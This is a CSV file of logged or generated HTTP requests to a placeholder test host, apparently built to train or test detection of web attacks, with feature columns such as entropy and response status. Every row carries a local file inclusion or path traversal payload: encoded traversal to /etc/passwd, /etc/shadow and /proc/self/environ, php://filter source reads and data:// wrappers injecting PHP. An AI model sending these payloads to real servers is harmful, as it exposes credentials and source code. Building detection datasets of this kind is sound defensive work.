timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T13:07:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.93,7,1,28,0,403,1068
2025-01-01T13:08:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.71,4,1,21,0,403,829
2025-01-01T13:09:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.12,4,1,21,0,200,921
2025-01-01T13:10:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.72,13,6,24,0,500,1090
2025-01-01T13:11:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.55,13,6,24,0,200,1081
2025-01-01T13:12:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.51,13,6,22,0,500,961
2025-01-01T13:13:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.4,7,1,28,0,403,878
2025-01-01T13:14:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.37,13,6,22,0,200,869
2025-01-01T13:15:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.73,13,4,36,0,200,1070
2025-01-01T13:16:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.63,7,1,28,0,200,1139
2025-01-01T13:17:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.28,10,5,19,0,500,1199
2025-01-01T13:18:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.58,10,5,19,0,200,1151
2025-01-01T13:19:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.44,3,4,18,0,200,903
2025-01-01T13:20:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.56,4,1,21,0,200,852
2025-01-01T13:21:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.32,7,1,28,0,500,730
2025-01-01T13:22:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.2,3,4,18,0,200,702
2025-01-01T13:23:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.86,13,6,24,0,200,1167
2025-01-01T13:24:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.67,4,1,21,0,403,1110
2025-01-01T13:25:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.14,9,5,53,0,403,792
2025-01-01T13:26:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.66,15,7,28,0,403,1149
2025-01-01T13:27:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.66,13,6,24,0,403,1088
2025-01-01T13:28:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.62,13,6,22,0,200,742
2025-01-01T13:29:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.45,7,1,28,0,403,761
2025-01-01T13:30:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.54,7,1,28,0,200,1042
2025-01-01T13:31:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.7,3,4,18,0,500,883
2025-01-01T13:32:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.65,13,4,36,0,200,808
2025-01-01T13:33:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.41,13,4,36,0,500,815
2025-01-01T13:34:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.23,9,5,53,0,500,852
2025-01-01T13:35:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.63,13,6,22,0,200,907
2025-01-01T13:36:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.21,3,4,18,0,500,922
2025-01-01T13:37:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.97,3,4,18,0,403,893
2025-01-01T13:38:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.16,13,4,36,0,200,700
2025-01-01T13:39:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.4,13,4,36,0,500,711
2025-01-01T13:40:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.95,10,5,19,0,200,853
2025-01-01T13:41:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.91,10,5,19,0,500,749
2025-01-01T13:42:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.26,10,1,27,0,500,1181
2025-01-01T13:43:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.59,13,6,22,0,403,995
2025-01-01T13:44:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.09,10,1,27,0,500,1076
2025-01-01T13:45:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.42,4,1,21,0,200,776
2025-01-01T13:46:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.51,15,7,28,0,200,1143
2025-01-01T13:47:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.6,4,1,21,0,500,863
2025-01-01T13:48:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.88,13,6,24,0,500,862
2025-01-01T13:49:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.81,10,5,19,0,200,1038
2025-01-01T13:50:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.49,10,5,19,0,200,1138
2025-01-01T13:51:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.28,13,6,24,0,500,957
2025-01-01T13:52:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.69,13,4,36,0,200,1054
2025-01-01T13:53:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.01,7,1,28,0,200,976
2025-01-01T13:54:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.5,3,4,18,0,200,1182
2025-01-01T13:55:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.9,10,1,27,0,403,989
2025-01-01T13:56:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.19,4,1,21,0,500,1150
2025-01-01T13:57:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.22,9,5,53,0,200,1055
2025-01-01T13:58:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.88,7,1,28,0,500,987
2025-01-01T13:59:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.62,9,5,53,0,403,736
2025-01-01T14:00:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.72,3,4,18,0,403,1011
2025-01-01T14:01:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.75,7,1,28,0,500,757
2025-01-01T14:02:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.08,10,5,19,0,403,828
2025-01-01T14:03:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.82,13,4,36,0,500,935
2025-01-01T14:04:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.53,13,6,22,0,200,899
2025-01-01T14:05:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.56,4,1,21,0,500,1037
2025-01-01T14:06:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.65,13,6,24,0,500,1031
2025-01-01T14:07:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.07,15,7,28,0,200,1146
2025-01-01T14:08:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.6,9,5,53,0,403,909
2025-01-01T14:09:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.18,15,7,28,0,500,1053
2025-01-01T14:10:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.04,9,5,53,0,200,1093
2025-01-01T14:11:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.83,4,1,21,0,200,875
2025-01-01T14:12:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.05,13,6,22,0,500,900
2025-01-01T14:13:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.86,15,7,28,0,500,1185
2025-01-01T14:14:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.92,10,5,19,0,500,1134
2025-01-01T14:15:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.58,10,5,19,0,500,782
2025-01-01T14:16:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.15,13,4,36,0,500,920
2025-01-01T14:17:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.89,9,5,53,0,500,787
2025-01-01T14:18:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.5,9,5,53,0,200,798
2025-01-01T14:19:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.71,15,7,28,0,403,1174
2025-01-01T14:20:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.98,10,1,27,0,403,771
2025-01-01T14:21:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.06,3,4,18,0,200,798
2025-01-01T14:22:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.71,13,6,24,0,403,711
2025-01-01T14:23:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.66,4,1,21,0,403,995
2025-01-01T14:24:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.23,7,1,28,0,403,1193
2025-01-01T14:25:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.88,13,4,36,0,403,1071
2025-01-01T14:26:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.99,10,5,19,0,403,738
2025-01-01T14:27:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.99,7,1,28,0,500,876
2025-01-01T14:28:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.5,7,1,28,0,500,1149
2025-01-01T14:29:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.65,13,4,36,0,200,1115
2025-01-01T14:30:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.98,4,1,21,0,500,1154
2025-01-01T14:31:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.63,7,1,28,0,403,868
2025-01-01T14:32:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.05,10,5,19,0,500,856
2025-01-01T14:33:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.11,13,6,24,0,500,852
2025-01-01T14:34:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.61,10,5,19,0,200,960
2025-01-01T14:35:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.27,13,4,36,0,200,809
2025-01-01T14:36:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.82,10,1,27,0,200,774
2025-01-01T14:37:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.29,15,7,28,0,403,1064
2025-01-01T14:38:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.94,13,6,24,0,403,1049
2025-01-01T14:39:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.04,10,5,19,0,200,1183
2025-01-01T14:40:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.85,10,1,27,0,200,959
2025-01-01T14:41:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.37,7,1,28,0,200,813
2025-01-01T14:42:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.45,13,6,24,0,200,1147
2025-01-01T14:43:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.01,7,1,28,0,403,890
2025-01-01T14:44:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.42,10,1,27,0,500,741
2025-01-01T14:45:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.55,13,4,36,0,403,1129
2025-01-01T14:46:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.18,13,4,36,0,500,904
2025-01-01T14:47:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.39,13,6,22,0,200,950
2025-01-01T14:48:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.18,13,6,24,0,500,1097
2025-01-01T14:49:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.41,10,1,27,0,200,847
2025-01-01T14:50:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.99,3,4,18,0,403,957
2025-01-01T14:51:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.3,13,6,22,0,500,1153
2025-01-01T14:52:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.08,13,6,22,0,403,806
2025-01-01T14:53:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.4,13,6,24,0,200,1192
2025-01-01T14:54:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.47,10,5,19,0,500,1139
2025-01-01T14:55:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.71,13,6,22,0,200,927
2025-01-01T14:56:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.56,3,4,18,0,500,1013
2025-01-01T14:57:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.82,3,4,18,0,403,1143
